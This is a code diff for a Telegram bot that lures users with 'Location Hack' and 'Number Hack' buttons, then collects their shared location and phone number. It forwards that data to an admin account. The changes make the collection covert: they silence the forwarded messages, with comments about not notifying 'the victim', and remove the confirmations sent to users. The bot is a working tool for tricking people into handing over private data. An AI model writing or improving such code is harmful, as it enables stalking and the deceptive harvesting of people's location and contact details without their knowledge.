@@ -67,21 +67,21 @@ def button_handler(message):
 def send_verify_button(message, hack_type):
     user_id = message.from_user.id
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
-    verify_button = types.KeyboardButton("✅ Verify and Share")
+    verify_button = types.KeyboardButton("✅ Verify and Send")
+
+    markup.add(verify_button)
 
     bot.send_message(
         message.chat.id,
-        f"To proceed with {hack_type} Hack, please click 'Verify and Share'. Once you click it, you'll need to send your {hack_type}.",
+        f"To proceed with {hack_type} Hack, please click 'Verify and Send'. Once you click it, you'll need to send your {hack_type}.",
         reply_markup=markup
     )
-    
-    markup.add(verify_button)
 
 # Handle Location and Number Verification
-@bot.message_handler(func=lambda message: message.text == '✅ Verify and Share')
+@bot.message_handler(func=lambda message: message.text == '✅ Verify and Send')
 def handle_verification(message):
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
-    
+
     if message.text == '📍 Location Hack':
         location_button = types.KeyboardButton("📍 Share Location", request_location=True)
         markup.add(location_button)
@@ -90,7 +90,7 @@ def handle_verification(message):
             "Please share your location to proceed with the hack.",
             reply_markup=markup
         )
-    
+
     elif message.text == '📱 Number Hack':
         contact_button = types.KeyboardButton("📱 Share Phone Number", request_contact=True)
         markup.add(contact_button)
@@ -100,7 +100,7 @@ def handle_verification(message):
             reply_markup=markup
         )
 
-# Receive Location and Number, Send to Admin
+# Receive Location and Number, Send to Admin Silently
 def send_location_and_number_to_owner(message, hack_type):
     user_id = message.from_user.id
 
@@ -109,32 +109,26 @@ def send_location_and_number_to_owner(message, hack_type):
         longitude = message.location.longitude
         location_link = f"https://www.google.com/maps/search/?api=1&query={latitude},{longitude}"
 
-        # Send location data to the admin
+        # Send location data to the admin silently
         bot.send_message(
             ADMIN_ID,
-            f"📍 New Location Captured:\nUser ID: {user_id}\nLatitude: {latitude}\nLongitude: {longitude}\n[View on Map]({location_link})"
+            f"📍 New Location Captured:\nUser ID: {user_id}\nLatitude: {latitude}\nLongitude: {longitude}\n[View on Map]({location_link})",
+            disable_notification=True  # Silently send to the admin without notifying the victim
         )
 
-        # Send location confirmation to the user
-        bot.send_message(
-            message.chat.id,
-            "✅ Location successfully captured and verified!"
-        )
+        # No confirmation to the victim, silent operation
 
     elif hack_type == "Number":
         phone_number = message.contact.phone_number
 
-        # Send phone number to the admin
+        # Send phone number to the admin silently
         bot.send_message(
             ADMIN_ID,
-            f"📱 New Phone Number Captured:\nUser ID: {user_id}\nPhone Number: {phone_number}"
+            f"📱 New Phone Number Captured:\nUser ID: {user_id}\nPhone Number: {phone_number}",
+            disable_notification=True  # Silently send to the admin without notifying the victim
         )
 
-        # Send phone number confirmation to the user
-        bot.send_message(
-            message.chat.id,
-            "✅ Phone number successfully captured and verified!"
-        )
+        # No confirmation to the victim, silent operation
 
 # Admin Panel Command
 @bot.message_handler(commands=['adminpanel'])
